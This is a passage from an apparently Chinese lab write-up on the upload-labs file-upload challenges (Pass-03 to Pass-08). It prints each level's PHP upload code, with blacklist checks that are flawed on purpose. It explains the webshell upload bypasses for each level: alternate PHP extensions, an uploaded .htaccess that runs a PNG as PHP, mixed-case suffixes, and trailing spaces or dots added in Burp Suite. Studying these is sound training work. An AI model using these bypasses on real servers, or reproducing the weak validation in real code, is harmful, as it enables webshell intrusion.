class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h2><p>这次是屏蔽了所有的<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>文件，但是黑名单定义不完全是可以绕过的可以用<code>.phtml</code>、<code>.phps</code>、<code>.php5</code>、<code>.pht</code>进行绕过。比如将文件名改为<code>webshell.php5</code>上传。<br>但是要想上传后能执行，要在自己的<code>apache</code>的<code>httpd.conf</code>文件写入，在<code>D:\你安装的位置\phpstudy_pro\Extensions\Apache2.4.39\conf</code>里写入：<br><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code><br>这样就成功传输和使用了。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p><strong>如果这样还是不行的话，就是php版本的问题，需要将Nts版本换为ts版本：</strong><a href="https://www.cnblogs.com/Article-kelp/p/14927087.html"><strong>https://www.cnblogs.com/Article-kelp/p/14927087.html</strong></a></p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h2><p>这下禁止上传的文件类型有很多种，我们可以尝试传一个<code>.htaccess</code>文件来把<code>.png</code>文件解析为<code>.php</code>类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;webshell.png&quot;</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h2><p>相比与第四关，第五关少了转换为小写的这一步骤，因此可以尝试修改为<code>.Php</code>后缀上传，连接成功。</p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h2><p>这次的代码和之前相比少了首尾去空，因此可以尝试在末尾加上空格，但是我们在本地是无法在末尾添加上空格的，所以需要在burpsuite抓包中修改上传的文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673682906593-0bfa79c4-182f-48d5-b349-280cda650687.png" alt="e4d6f42cc4fc3bf888b6ceb79f1001e.png"><br>这样就可以上传成功。</p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件不允许上传&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h2><p>这次缺少了删除文件末尾的点，因此可以在文件末尾添加点来绕过，还是直接在bp中修改文件名并上传即可。</p><h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        